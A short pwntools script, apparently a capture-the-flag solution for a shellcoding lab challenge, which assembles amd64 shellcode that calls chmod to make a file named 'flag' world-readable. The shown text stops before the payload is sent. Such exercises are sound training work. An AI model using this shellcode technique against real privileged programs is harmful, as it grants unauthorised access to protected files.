from pwn import *

p = process('/challenge/babyshell-level-8', aslr=False)
context.update(arch="amd64")

flag = b'flag'[::-1].hex()

shellcode = asm(
f'''
push 0x{flag}
push rsp
pop rdi

push 0777
pop rsi

push  0x5a
pop rax
syscall
''')
